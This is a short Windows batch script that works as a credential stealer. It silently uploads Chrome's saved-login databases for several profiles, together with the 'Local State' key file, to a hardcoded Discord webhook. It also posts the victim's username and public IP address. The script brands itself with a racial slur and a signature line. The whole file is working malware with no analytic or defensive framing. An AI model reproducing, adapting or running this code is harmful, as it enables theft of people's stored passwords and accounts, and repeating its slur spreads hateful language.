@echo off

set "vpath=C:\ProgramData"

cd %vpath%

set "webhook=https://discord.com/api/webhooks/1098881319649427497/6kcKBnGyhQSyT6WmREqxG810VbFIONOwc_fyhfHAie6w7fRRuW3uz7caSu2xkdQsJDth"

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %PublicIP% - Nigger stealer]```\"}"  %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- Passwords stolen -```\"}"  %webhook%
curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %webhook%
curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Guest Profile\Login Data" %webhook%
curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 1\Login Data" %webhook%
curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 2\Login Data" %webhook%
curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Stolen by Alec Molotova Kozlov```\"}"  %webhook%
